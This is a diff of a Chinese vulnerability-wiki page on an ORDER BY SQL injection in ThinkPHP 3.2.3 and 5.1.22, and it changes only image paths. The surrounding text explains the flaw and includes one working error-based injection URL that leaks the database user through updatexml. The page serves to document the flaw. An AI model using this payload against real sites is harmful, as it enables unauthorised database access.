@@ -18,11 +18,11 @@ ThinkPHP 3.2.3、5.1.22及以下版本。
 
 ThinkPHP3.2.3漏洞代码（/Library/Think/Db/Driver.class.php）：
 
-![](/Users/aresx/Documents/VulWiki/.resource/Thinkphp3.xorderby注入漏洞/media/rId24.png)
+![](./.resource/Thinkphp3.xorderby注入漏洞/media/rId24.png)
 
 ThinkPHP 5.1.22漏洞代码（framework/library/think/db/Query.php）：
 
-![](/Users/aresx/Documents/VulWiki/.resource/Thinkphp3.xorderby注入漏洞/media/rId25.png)
+![](./.resource/Thinkphp3.xorderby注入漏洞/media/rId25.png)
 
 从上面漏洞代码可以看出，当\$field参数为关联数组（key-value）时，key值拼接到返回值中，SQL语句最终绕过了框架安全过滤得以执行。
 
@@ -32,7 +32,7 @@ ThinkPHP 5.1.22漏洞代码（framework/library/think/db/Query.php）：
 
     http://www.0-sec.org/ThinkPHP/?order[updatexml(1,concat(0x3a,user()),1)]=1
 
-![](/Users/aresx/Documents/VulWiki/.resource/Thinkphp3.xorderby注入漏洞/media/rId27.png)
+![](./.resource/Thinkphp3.xorderby注入漏洞/media/rId27.png)
 
 参考链接
 --------
